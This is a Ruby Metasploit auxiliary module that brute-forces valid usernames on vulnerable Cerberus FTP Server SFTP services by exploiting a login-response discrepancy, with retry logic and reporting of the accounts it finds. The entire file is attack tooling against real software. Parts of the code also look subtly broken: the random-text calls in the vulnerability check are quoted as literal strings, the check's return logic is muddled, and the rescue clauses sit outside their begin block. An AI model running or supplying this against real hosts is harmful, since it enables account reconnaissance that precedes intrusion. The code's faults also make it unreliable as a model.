##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Cerberus FTP Server SFTP Username Enumeration',
      'Description' => %q{
        This module uses a dictionary to brute force valid usernames from
        Cerberus FTP server via SFTP.  This issue affects all versions of
        the software older than 6.0.9.0 or 7.0.0.2 and is caused by a discrepancy
        in the way the SSH service handles failed logins for valid and invalid
        users.  This issue was discovered by Steve Embling.
      },
      'Author'      => ['Matt Byrne <attackdebris [at] gmail.com>'],
      'References'     =>
        [
          [ 'URL',   'http://xforce.iss.net/xforce/alerts/id/166' ],
          [ 'BID', '67707'],
        ],
      'License'     => MSF_LICENSE,
      'DisclosureDate' => 'May 27 2014'
    ))

    register_options(
      [
        Opt::RPORT(22),
        OptPath.new('USER_FILE',
                    [true, 'Files containing usernames, one per line', nil])
      ], self.class
    )

    register_advanced_options(
      [
        OptInt.new('RETRY_NUM',
                   [true , 'The number of attempts to connect to a SSH server' \
                   ' for each user', 3]),
        OptInt.new('SSH_TIMEOUT',
                   [false, 'Specify the maximum time to negotiate a SSH session',
                   10]),
        OptBool.new('SSH_DEBUG',
                    [false, 'Enable SSH debugging output (Extreme verbosity!)',
                    false])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def retry_num
    datastore['RETRY_NUM']
  end

  def check_vulnerable(ip)
    options = {
      :user => 'Rex::Text.rand_text_alphanumeric(8)',
      :password => 'Rex::Text.rand_text_alphanumeric(64_000)',
      :port => rport
}
    transport = Net::SSH::Transport::Session.new(ip, options)
    auth = Net::SSH::Authentication::Session.new(transport, options)

    auth.authenticate("ssh-connection", options[:user], options[:password])
    auth_method = auth.allowed_auth_methods.join('|')
    print_status "SSH Server Version: #{auth.transport.server_version.version}"
    report_service(:host => ip, :port => rport, :name => "ssh", :proto => "tcp", :info => auth.transport.server_version.version)

    if auth_method != ''
      :fail
    end
  end

  def check_user(ip, user, port)
    pass = Rex::Text.rand_text_alphanumeric(64_000)

    opt_hash = {
      :auth_methods  => ['password', 'keyboard-interactive'],
      :msframework   => framework,
      :msfmodule     => self,
      :port          => port,
      :disable_agent => true,
      :password      => pass,
      :config        => false,
      :proxies       => datastore['Proxies']
    }

    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
    transport = Net::SSH::Transport::Session.new(ip, opt_hash)
    auth = Net::SSH::Authentication::Session.new(transport, opt_hash)

    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
      auth.authenticate("ssh-connection", user, pass)
      auth_method = auth.allowed_auth_methods.join('|')
      if auth_method != ''
        :success
      else
        :fail
      end
      end
    end
    rescue Rex::ConnectionError, Rex::AddressInUse
      return :connection_error
    rescue Net::SSH::Disconnect, ::EOFError
      return :success
    rescue ::Timeout::Error
      return :success
    rescue Net::SSH::Exception
    end

  def do_report(ip, user, port)
    report_auth_info(
      :host   => ip,
      :port   => rport,
      :sname  => 'ssh',
      :user   => user,
      :active => true
    )
  end

  def peer(rhost=nil)
    "#{rhost}:#{rport} SSH -"
  end

  def user_list
    if File.readable? datastore['USER_FILE']
      File.new(datastore['USER_FILE']).read.split
    else
      raise ArgumentError, "Cannot read file #{datastore['USER_FILE']}"
    end
  end

  def attempt_user(user, ip)
    attempt_num = 0
    ret = nil

    while attempt_num <= retry_num and (ret.nil? or ret == :connection_error)
      if attempt_num > 0
        Rex.sleep(2 ** attempt_num)
        print_debug "#{peer(ip)} Retrying '#{user}' due to connection error"
      end

      ret = check_user(ip, user, rport)
      attempt_num += 1
    end

    ret
  end

  def show_result(attempt_result, user, ip)
    case attempt_result
    when :success
      print_good "#{peer(ip)} User '#{user}' found"
      do_report(ip, user, rport)
    when :connection_error
      print_error "#{peer(ip)} User '#{user}' on could not connect"
    when :fail
      print_debug "#{peer(ip)} User '#{user}' not found"
   end
  end

  def run_host(ip)
    print_status "#{peer(ip)} Checking for vulnerability"
    if check_vulnerable(ip)
      print_error "#{peer(ip)} is not vulnerable. Aborting."
      return
    else
      print_status "#{peer(ip)} is vulnerable"
      print_status "#{peer(ip)} Starting scan"
      user_list.each{ |user| show_result(attempt_user(user, ip), user, ip) }
    end
  end
end
